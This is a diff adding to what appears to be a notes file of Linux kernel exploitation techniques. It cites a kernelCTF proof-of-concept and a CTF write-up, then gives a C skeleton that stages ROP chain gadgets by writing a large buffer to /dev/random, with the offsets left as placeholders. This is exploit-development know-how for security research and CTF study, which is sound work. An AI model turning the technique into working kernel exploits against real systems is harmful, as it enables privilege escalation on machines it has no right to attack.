@@ -192,3 +192,30 @@ int main(int argc, char** argv, char** envp)
 - example:
   - https://github.com/google/security-research/blob/b8be9f3f78a45abf1da31795d66b38cb7ede79e2/pocs/linux/kernelctf/CVE-2025-21703_lts_2/docs/novel-techniques.md - the trick raised by [@u1f383](https://github.com/u1f383)
   - I know the trick in [wm_easyker && wm_easynetlink writeup](https://cnitlrt.github.io/wmctf2025/#wm_easyker) by [@cnitlrt](https://cnitlrt.github.io/about/)
+```c
+#ifndef _GNU_SOURCE
+#define _GNU_SOURCE
+#endif
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <string.h>
+
+#define WRITE_RANDOM_SIZE 0x100000ul
+int main() {
+    int random_fd = -1;
+    unsigned long* random_data;
+    random_fd = open("/dev/random", O_WRONLY);
+    random_data = mmap(NULL, WRITE_RANDOM_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+    memset(random_data, 'X', WRITE_RANDOM_SIZE);
+    // place rop chain
+    random_data[A magic offset - please debug + 0] = gadget0;
+    random_data[A magic offset - please debug + 1] = gadget1;
+    random_data[A magic offset - please debug + 2] = gadget2;
+    write(random_fd, random_data, WRITE_RANDOM_SIZE);
+}
+```
